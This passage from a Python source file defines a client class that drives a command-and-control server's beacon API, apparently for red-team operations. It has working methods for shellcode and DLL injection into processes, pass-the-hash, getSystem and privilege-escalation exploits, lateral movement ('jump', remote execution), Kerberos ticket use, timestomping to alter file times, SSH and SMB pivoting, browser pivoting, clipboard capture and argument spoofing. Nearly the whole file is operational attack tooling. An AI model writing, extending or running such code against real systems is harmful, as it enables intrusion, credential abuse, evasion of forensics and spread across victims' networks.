        """Spec: PortScanSpawnDto {targets: [string], ports: [string], method, maxConnections} — all required."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/portscan", {
            "targets": targets or [], "ports": ports or [], "method": method, "maxConnections": max_connections,
        })

    def inject_portscan(self, bid, pid, targets=None, ports=None, method="arp", arch="x64", max_connections=1024):
        """Spec: PortScanInjectDto {arch, pid, targets: [string], ports: [string], method, maxConnections} — all required."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/portscan", {
            "arch": arch, "pid": int(pid), "targets": targets or [], "ports": ports or [],
            "method": method, "maxConnections": max_connections,
        })

    def spawn_execute_assembly(self, bid, assembly, arguments="", files=None):
        """Execute .NET assembly via spawn (fork&run)."""
        payload = {"assembly": assembly}
        if arguments:
            payload["arguments"] = arguments
        if files:
            payload["files"] = files
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/dotnetAssembly", payload)

    # ── Privilege Escalation ──
    def list_elevate_methods(self, bid):
        """List available privesc methods."""
        return self._api_get(f"/api/v1/beacons/{bid}/elevate/beacon")

    def list_runasadmin_methods(self, bid):
        """List available command elevation methods."""
        return self._api_get(f"/api/v1/beacons/{bid}/elevate/command")

    # ── Remote Execution ──
    def list_jump_methods(self, bid):
        """List remote beacon execution methods (jump)."""
        return self._api_get(f"/api/v1/beacons/{bid}/remoteExec/beacon")

    def list_remote_exec_methods(self, bid):
        """List remote command execution methods."""
        return self._api_get(f"/api/v1/beacons/{bid}/remoteExec/command")

    # ══════════════════════════════════════════════════════════════════
    # MISSING ENDPOINTS — Full spec coverage below
    # ══════════════════════════════════════════════════════════════════

    # ── FileAndRegistry: cd, cp, mv, pwd, reg, timestomp ──
    def change_directory(self, bid, path):
        """Spec: POST /execute/cd — CdDto {path: string (required)}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/cd", {"path": path})

    def copy_file(self, bid, src, dst):
        """Spec: POST /execute/cp — CpDto {src, dst (both required)}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/cp", {"src": src, "dst": dst})

    def move_file(self, bid, source, destination):
        """Spec: POST /execute/mv — MoveDto {source, destination (both required)}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/mv", {"source": source, "destination": destination})

    def print_working_directory(self, bid):
        """Spec: POST /execute/pwd — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/pwd")

    def reg_query(self, bid, arch, path):
        """Spec: POST /execute/reg/query — RegQueryDto {arch (x86|x64, required), path (required)}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/reg/query", {"arch": arch, "path": path})

    def reg_queryv(self, bid, arch, path, subkey):
        """Spec: POST /execute/reg/queryv — RegQueryValueDto {arch (required), path (required), subkey (required)}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/reg/queryv", {"arch": arch, "path": path, "subkey": subkey})

    def timestomp(self, bid, source, destination):
        """Spec: POST /execute/timestomp — TimeStompDto {source (copy FROM), destination (apply TO)}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/timestomp", {"source": source, "destination": destination})

    def get_download_data(self, download_id):
        """Spec: GET /data/downloads/{id}."""
        return self._api_get(f"/api/v1/data/downloads/{download_id}")

    def delete_download_data(self, download_id):
        """Spec: DELETE /data/downloads/{id}."""
        return self._api_delete(f"/api/v1/data/downloads/{download_id}")

    # ── ProcessAndExecution: exit, getPrivs, getSystem, setenv, powershell, run/shell, pth, shellcode, dll ──
    def exit_beacon(self, bid):
        """Spec: POST /execute/exit — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/exit")

    def get_privs(self, bid):
        """Spec: POST /execute/getPrivs — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/getPrivs")

    def get_system(self, bid):
        """Spec: POST /execute/getSystem — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/getSystem")

    def set_env(self, bid, key, value=""):
        """Spec: POST /execute/setenv — SetEnvDto {key (required), value}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/setenv", {"key": key, "value": value})

    def powershell_import(self, bid, script):
        """Spec: POST /execute/powershell/import — PowershellImportDto {script}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/powershell/import", {"script": script})

    def spawn_shell(self, bid, command):
        """Spec: POST /spawn/command/shell — ShellDto {command}."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/command/shell", {"command": command})

    def spawn_run(self, bid, program, arguments=""):
        """Spec: POST /spawn/command/run — RunDto {program, arguments}."""
        payload = {"program": program}
        if arguments:
            payload["arguments"] = arguments
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/command/run", payload)

    def spawn_run_as(self, bid, command, arguments="", domain="", user="", password=""):
        """Spec: POST /spawn/command/runAs — RunAsDto {command (required), user, password, domain?, arguments?}."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/command/runAs", {
            "command": command, "arguments": arguments,
            "domain": domain, "user": user, "password": password,
        })

    def spawn_run_under(self, bid, command, arguments="", pid=0):
        """Spec: POST /spawn/command/runUnder — RunUDto {command (required), pid (required), arguments}."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/command/runUnder", {
            "command": command, "arguments": arguments, "pid": int(pid),
        })

    def spawn_run_no_output(self, bid, cmd):
        """Spec: POST /spawn/command/runNoOutput — ExecuteDto {cmd (required)}."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/command/runNoOutput", {"cmd": cmd})

    def spawn_powershell(self, bid, commandlet, arguments=""):
        """Spec: POST /spawn/powershell — PowerShellDto {commandlet (required), arguments}."""
        payload = {"commandlet": commandlet}
        if arguments:
            payload["arguments"] = arguments
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/powershell", payload)

    def spawn_powerpick(self, bid, commandlet, arguments=""):
        """Spec: POST /spawn/powershell/unmanaged — PowerPickDto {commandlet (required), arguments}."""
        payload = {"commandlet": commandlet}
        if arguments:
            payload["arguments"] = arguments
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/powershell/unmanaged", payload)

    def inject_psinject(self, bid, pid, arch, commandlet):
        """Spec: POST /inject/powershell/unmanaged — PowerShellInject {pid, arch, commandlet (required)}."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/powershell/unmanaged", {
            "pid": int(pid), "arch": arch, "commandlet": commandlet,
        })

    def spawn_pth(self, bid, domain, user, ntlmHash):
        """Spec: POST /spawn/pth — PthSpawnDto {domain, user, ntlmHash}."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/pth", {
            "domain": domain, "user": user, "ntlmHash": ntlmHash,
        })

    def inject_pth(self, bid, pid, arch, domain, user, ntlmHash):
        """Spec: POST /inject/pth — PthInjectDto {pid, arch, domain, user, ntlmHash (all required)}."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/pth", {
            "pid": int(pid), "arch": arch, "domain": domain, "user": user, "ntlmHash": ntlmHash,
        })

    def spawn_shellcode(self, bid, arch, shellcode, files=None):
        """Spec: POST /spawn/shellcode — ShSpawnDto {arch (required), shellcode (required), files?}."""
        payload = {"arch": arch, "shellcode": shellcode}
        if files:
            payload["files"] = files
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/shellcode", payload)

    def inject_shellcode(self, bid, pid, arch, shellcode):
        """Spec: POST /inject/shellcode — ShellcodeInjectDto {pid, arch, shellcode}."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/shellcode", {
            "pid": int(pid), "arch": arch, "shellcode": shellcode,
        })

    def spawn_beacon(self, bid, listener):
        """Spec: POST /spawn/beacon — BeaconSpawnDto {listener}."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/beacon", {"listener": listener})

    def spawn_beacon_as_user(self, bid, listener, domain, user, password):
        """Spec: POST /spawn/beacon/asUser — BeaconSpawnAsUserDto {listener, domain, user, password}."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/beacon/asUser", {
            "listener": listener, "domain": domain, "user": user, "password": password,
        })

    def spawn_beacon_under(self, bid, listener, pid):
        """Spec: POST /spawn/beacon/under — SpawnuDto {listener (required), pid (required, int32)}."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/beacon/under", {
            "listener": listener, "pid": int(pid),
        })

    def inject_beacon(self, bid, pid, arch, listener):
        """Spec: POST /inject/beacon — BeaconInjectDto {pid, arch, listener}."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/beacon", {
            "pid": int(pid), "arch": arch, "listener": listener,
        })

    def inject_dll(self, bid, pid, dll, files=None):
        """Spec: POST /inject/dll — DllInjectDto {pid, dll, files}."""
        payload = {"pid": int(pid), "dll": dll}
        if files:
            payload["files"] = files
        return self._api_post(f"/api/v1/beacons/{bid}/inject/dll", payload)

    def inject_load_dll(self, bid, pid, path):
        """Spec: POST /inject/loadDll — DllLoadDto {pid (required), path (required)}."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/loadDll", {"pid": int(pid), "path": path})

    # ── Privilege Escalation: execute elevate + runasadmin ──
    def elevate_beacon(self, bid, exploit, listener):
        """Spec: POST /elevate/beacon — ElevateDto {exploit, listener}."""
        return self._api_post(f"/api/v1/beacons/{bid}/elevate/beacon", {
            "exploit": exploit, "listener": listener,
        })

    def run_as_admin(self, bid, exploit, command, arguments=""):
        """Spec: POST /elevate/command — RunAsAdminDto {exploit, command, arguments}."""
        payload = {"exploit": exploit, "command": command}
        if arguments:
            payload["arguments"] = arguments
        return self._api_post(f"/api/v1/beacons/{bid}/elevate/command", payload)

    # ── Remote Execution: execute jump + remote-exec ──
    def jump(self, bid, exploit, target, listener):
        """Spec: POST /remoteExec/beacon — JumpDto {exploit, target, listener}."""
        return self._api_post(f"/api/v1/beacons/{bid}/remoteExec/beacon", {
            "exploit": exploit, "target": target, "listener": listener,
        })

    def remote_exec(self, bid, method, target, command):
        """Spec: POST /remoteExec/command — RemoteExecDto {method, target, command}."""
        return self._api_post(f"/api/v1/beacons/{bid}/remoteExec/command", {
            "method": method, "target": target, "command": command,
        })

    # ── CredsAndTokens: kerberos, UPN token, postExDll ──
    def kerberos_ticket_use(self, bid, ticket):
        """Spec: POST /execute/kerberos/ticket/use — KerberosTicketUseDto {ticket}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/kerberos/ticket/use", {"ticket": ticket})

    def kerberos_ticket_purge(self, bid):
        """Spec: POST /execute/kerberos/ticket/purge — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/kerberos/ticket/purge")

    def make_token_upn(self, bid, upn, password):
        """Spec: POST /execute/makeToken/upn — MakeTokenUpnDto {upn, password}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/makeToken/upn", {
            "upn": upn, "password": password,
        })

    def spawn_post_ex_dll(self, bid, dll, files=None):
        """Spec: POST /spawn/postExDll — PostExDllSpawnDto {dll, files}."""
        payload = {"dll": dll}
        if files:
            payload["files"] = files
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/postExDll", payload)

    def inject_post_ex_dll(self, bid, pid, dll, files=None):
        """Spec: POST /inject/postExDll — PostExDllInjectDto {pid, dll, files}."""
        payload = {"pid": int(pid), "dll": dll}
        if files:
            payload["files"] = files
        return self._api_post(f"/api/v1/beacons/{bid}/inject/postExDll", payload)

    # ── NetworkRecon: net domain + all spawn/inject net variants ──
    def net_domain(self, bid):
        """Spec: POST /execute/net/domain — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/net/domain")

    def spawn_net(self, bid, subcmd, domain=""):
        """Spec: POST /spawn/net/{subcmd} — various DTOs, all have optional domain."""
        payload = {}
        if domain:
            payload["domain"] = domain
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/net/{subcmd}", payload)

    def inject_net(self, bid, pid, arch, subcmd, domain=""):
        """Spec: POST /inject/net/{subcmd} — various DTOs with {pid, arch, domain?}."""
        payload = {"pid": int(pid), "arch": arch}
        if domain:
            payload["domain"] = domain
        return self._api_post(f"/api/v1/beacons/{bid}/inject/net/{subcmd}", payload)

    def spawn_net_user_detail(self, bid, domain="", user=""):
        """Spec: POST /spawn/net/user/detail — NetUserDetailDto {domain, user}."""
        payload = {}
        if domain:
            payload["domain"] = domain
        if user:
            payload["user"] = user
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/net/user/detail", payload)

    def inject_net_user_detail(self, bid, pid, arch, domain="", user=""):
        """Spec: POST /inject/net/user/detail — NetUserDetailInjectDto {pid, arch, domain, user}."""
        payload = {"pid": int(pid), "arch": arch}
        if domain:
            payload["domain"] = domain
        if user:
            payload["user"] = user
        return self._api_post(f"/api/v1/beacons/{bid}/inject/net/user/detail", payload)

    # ── Pivoting: link, unlink, SSH, browser pivot ──
    def link_smb(self, bid, target, pipe=""):
        """Spec: POST /execute/link/smb — LinkDto {target (required), pipe?}."""
        payload = {"target": target}
        if pipe:
            payload["pipe"] = pipe
        return self._api_post(f"/api/v1/beacons/{bid}/execute/link/smb", payload)

    def link_tcp(self, bid, target, port):
        """Spec: POST /execute/link/tcp — LinkTcpDto {target, port}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/link/tcp", {
            "target": target, "port": int(port),
        })

    def unlink(self, bid, host, pid=None):
        """Spec: POST /execute/unlink — UnlinkDto {host (required), pid? (int32)}."""
        payload = {"host": host}
        if pid is not None:
            payload["pid"] = int(pid)
        return self._api_post(f"/api/v1/beacons/{bid}/execute/unlink", payload)

    def spawn_ssh(self, bid, target, username, password):
        """Spec: POST /spawn/ssh — SshSpawnDto {target (required), username (required), password (required)}."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/ssh", {
            "target": target, "username": username, "password": password,
        })

    def inject_ssh(self, bid, pid, arch, target, username, password):
        """Spec: POST /inject/ssh — SshInjectDto {pid, arch, target, username, password (all required)}."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/ssh", {
            "pid": int(pid), "arch": arch, "target": target,
            "username": username, "password": password,
        })

    def spawn_ssh_key(self, bid, target, username, key):
        """Spec: POST /spawn/sshKey — SshKeySpawnDto {target, username, key (all required)}."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/sshKey", {
            "target": target, "username": username, "key": key,
        })

    def inject_ssh_key(self, bid, pid, arch, target, username, key):
        """Spec: POST /inject/sshKey — SshKeyInjectDto {pid, arch, target, username, key (all required)}."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/sshKey", {
            "pid": int(pid), "arch": arch, "target": target,
            "username": username, "key": key,
        })

    def browser_pivot_start(self, bid, pid, arch):
        """Spec: POST /inject/browserpivotStart — BrowserPivotStartDto {pid, arch}."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/browserpivotStart", {
            "pid": int(pid), "arch": arch,
        })

    def browser_pivot_stop(self, bid):
        """Spec: POST /execute/browserpivotStop — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/browserpivotStop")

    # ── Capture: clipboard ──
    def get_clipboard(self, bid):
        """Spec: POST /execute/clipboard — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/clipboard")

    # ── ConsoleCommand: help ──
    def get_help(self, bid):
        """Spec: GET /help — list available commands."""
        return self._api_get(f"/api/v1/beacons/{bid}/help")

    def get_command_help(self, bid, command):
        """Spec: GET /help/{command} — help for specific command."""
        return self._api_get(f"/api/v1/beacons/{bid}/help/{command}")

    # ── Tasks: log/error writing ──
    def log_task_message(self, task_id, message):
        """Spec: POST /tasks/{taskId}/log — PublishOutputDto {message}."""
        return self._api_post(f"/api/v1/tasks/{task_id}/log", {"message": message})

    def log_task_error(self, task_id, message):
        """Spec: POST /tasks/{taskId}/error — PublishOutputDto {message}."""
        return self._api_post(f"/api/v1/tasks/{task_id}/error", {"message": message})

    # ── Spawnto reset ──
    def reset_spawnto(self, bid):
        """Spec: DELETE /state/spawnto — reset to default."""
        return self._api_delete(f"/api/v1/beacons/{bid}/state/spawnto")

    # ── Spoofed Arguments: list + remove ──
    def list_spoofed_arguments(self, bid):
        """Spec: GET /state/spoofedArguments — list current argument spoofing."""
        return self._api_get(f"/api/v1/beacons/{bid}/state/spoofedArguments")

    def remove_spoofed_arguments(self, bid, command):
        """Spec: DELETE /state/spoofedArguments — SpoofedArgumentsRemoveDto {command}."""
        return self._api_delete(f"/api/v1/beacons/{bid}/state/spoofedArguments", {"command": command})


# Singleton instance
beacon_service = BeaconService()
